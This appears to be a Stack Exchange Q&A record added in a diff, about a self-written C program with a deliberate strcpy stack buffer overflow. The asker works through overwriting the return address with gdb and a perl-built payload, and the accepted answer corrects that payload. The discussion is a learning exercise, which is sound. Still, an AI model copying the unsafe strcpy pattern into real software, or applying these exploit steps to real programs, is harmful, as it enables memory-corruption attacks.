@@ -1,0 +1,50 @@
+{
+    "title": "Writing an exploit for sample-application",
+    "link": "https://reverseengineering.stackexchange.com/questions/11020/writing-an-exploit-for-sample-application",
+    "content": "I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:\n<pre><code>#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid public(char *args) {\n    char buff[12];\n    memset(buff, 'B', sizeof(buff));\n\n    strcpy(buff, args);\n    printf(\"\nbuff: [%s] (%p)(%d)\n\n\", &buff, buff, sizeof(buff));\n}\n\nvoid secret(void) {\n    printf(\"SECRET\n\");\n    exit(0);\n}\n\nint main(int argc, char *argv[]) {\n    int uid;\n    uid = getuid();\n\n    // Only when the user is root\n    if (uid == 0)\n        secret();\n\n    if (argc > 1) {\n        public(argv[1]);\n    }\n    else\n        printf(\"Kein Argument!\n\");\n}\n</code></pre>\nWhen the user which starts the program is root, the method <pre><code>secret()</code></pre> is being called, otherwise, the method <pre><code>public(...)</code></pre> is being called.\nI am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).\nI compiled the program with gcc: <pre><code>gcc ret.c -o ret -m32 -g -fno-stack-protector</code></pre>\n\nTarget:\nI want to call the method <pre><code>secret()</code></pre> without being a root-user. {To do that I have to overwrite the <pre><code>R</code></pre>eturn <pre><code>I</code></pre>nstruction <pre><code>P</code></pre>ointer (<pre><code>RIP</code></pre>) with the address of the function <pre><code>secret()</code></pre>}\nVulnerability:\nThe method <pre><code>public(...)</code></pre> copies the program-args with the unsafe <pre><code>strcpy()</code></pre> method into the <pre><code>char-array</code></pre> buff. So it is possible to overwrite data on the stack, when the user starts the program with an arg > 11, where arg should be the length of the string-arg.\nRequired Information:\n\nThe address of the function <pre><code>secret()</code></pre>.\nThe address of the first buffer's first element. Due to <pre><code>ASCII</code></pre>-Encoding I know that each <pre><code>char</code></pre> has a size of <pre><code>1 byte</code></pre>, so that the buffer's last element is <pre><code>12 bytes</code></pre> ahead the first element.\nThe address of the <pre><code>RIP</code></pre>, because I have to overwrite it <pre><code>secret()</code></pre>s address.\nOPTIONAL: It also helps to know the address of the <pre><code>S</code></pre>afed <pre><code>F</code></pre>rame <pre><code>P</code></pre>ointer (<pre><code>SFP</code></pre>).\n\nMethodical approach:\n\nLoad the program into <pre><code>gdb</code></pre>: <pre><code>gdb -q ret</code></pre>.\nTo get an overview of the full stack-frame of the method <pre><code>public(...)</code></pre> I have to set a breakpoint there, where the <pre><code>function-epilogue</code></pre> starts. This is at the enclosing brace <pre><code>}</code></pre> at line <pre><code>11</code></pre>.\nNow I have to run the program with a valid arg: <pre><code>run A</code></pre>.\nAt the breakpoint, I now want to view the stack-frame.\n<pre><code>(gdb) info frame 0\nStack frame at 0xffffd2f0:\n eip = 0x804852d in public (ret.c:11); saved eip = 0x804858c\n called by frame at 0xffffd330\n source language c.\n Arglist at 0xffffd2e8, args: args=0xffffd575 \"A\"\n Locals at 0xffffd2e8, Previous frame's sp is 0xffffd2f0\n Saved registers:\n  ebp at 0xffffd2e8, eip at 0xffffd2ec\n</code></pre>\nBecause from that I can gather the following information:\n\nThe <pre><code>RIP</code></pre> is located at <pre><code>0xffffd2ec</code></pre> and contains the address <pre><code>0x804858c</code></pre> which contains the instruction <pre><code>0x804858c <main+61>: add    $0x10,%esp</code></pre>.\nThe <pre><code>SFP</code></pre> is located at <pre><code>0xffffd2e8</code></pre>.\nNow I need the address, where the <pre><code>secret()</code></pre>-function starts:\n(gdb) print secret\n$2 = {void (void)} 0x804852f \n\nLast, but not least I get the buffer's address:\n<pre><code>(gdb) print/x &buff\n$4 = 0xffffd2d4\n</code></pre>\nTo sum it up:\n\n<pre><code>RIP</code></pre> is at <pre><code>0xffffd2ec</code></pre>.\n<pre><code>SFP</code></pre> is at <pre><code>0xffffd2e8</code></pre>.\n<pre><code>buff</code></pre> is at <pre><code>0xffffd2d4</code></pre>.\n\n\nThis means that I would have to run the program with <pre><code>0xffffd2ec</code></pre> - <pre><code>0xffffd2d4</code></pre> + <pre><code>0x04</code></pre> = <pre><code>28 bytes</code></pre> (= <pre><code>char</code></pre>s).\nSo, to exploit it I'd have to run the program with an arg which is <pre><code>28 bytes</code></pre> long whereas the last <pre><code>4 bytes</code></pre> contain the address of the function <pre><code>secret()</code></pre> (and pay attention to little-endian-ordering):\n<pre><code>(gdb) run `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/patrick/Projekte/C/I. Stack_Overflow/ret `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\n\nbuff: [AAAAAAAAAAAAAAAAAAAAAAAA�d2\n                                  f\n                                   f] (0xffffd2b4)(12)\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0c3264ec in ?? ()\n</code></pre>\nTwo questions are rising up:\n\nWhy is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....\nWhy is between <pre><code>buff</code></pre> and the <pre><code>SFP</code></pre> a <pre><code>8-byte</code></pre> gap? What does this memory-area contain?\n\nEDIT: That's a download-link to the binary.\n",
+    "votes": "5",
+    "answers": 1,
+    "views": "3k",
+    "tags": [
+        "c++",
+        "gdb",
+        "c",
+        "exploit",
+        "stack"
+    ],
+    "user": "JDoens",
+    "time": "Oct 4, 2015 at 22:58",
+    "comments": [
+        {
+            "user": "Jason Geffner",
+            "text": "It would help if you could provide a link to the binary.\n",
+            "time": null
+        },
+        {
+            "user": "JDoens",
+            "text": "Thanks that you want to help me! That's the link to the binary.\n",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....\n\n\nIt's because you're overwriting the return address on the stack with <pre><code>0xffffd2ec</code></pre> instead of <pre><code>0x0804852f</code></pre> (the latter is the address for <pre><code>secret()</code></pre>).\nIf you thus use <pre><code>'{print \"A\"x24; print \"\\x2f\\85\\04\\08\"; }'</code></pre> instead, it should work.\n\n\nWhy is between <pre><code>buff</code></pre> and the <pre><code>SFP</code></pre> a <pre><code>8-byte</code></pre> gap? What does this memory-area contain?\n\n\nThat gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the <pre><code>public()</code></pre> function neither reads from nor writes to that memory-area.\n",
+            "votes": "5",
+            "user": "Jason Geffner",
+            "time": "Oct 4, 2015 at 23:49",
+            "is_accepted": true,
+            "comments": [
+                {
+                    "user": "JDoens",
+                    "text": "<span class=\"comment-copy\">Thanks! You are right, I did not overwrite the <code>RIP</code> with <code>secret()</code>s address. But you forgot to reverse the byte-order (it's little-endian).</span>",
+                    "time": null
+                },
+                {
+                    "user": "Jason Geffner",
+                    "text": "<span class=\"comment-copy\">Good catch; just fixed the byte-order.</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
